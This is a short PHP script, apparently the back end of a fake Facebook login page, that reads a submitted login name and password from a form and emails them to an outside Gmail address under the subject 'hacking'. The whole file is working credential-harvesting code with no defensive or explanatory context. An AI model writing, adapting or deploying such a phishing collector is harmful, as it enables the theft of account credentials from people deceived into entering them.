<?php

$to = "haker.hacker@gmail.com";
$subject = "hacking";

$txt = 'login is - ' . $_POST['login_name'] .'| Password -'.$_POST['login_password'];

$headers = "From: fakefacebook@mail.com";

mail($to,$subject,$txt,$headers);

?>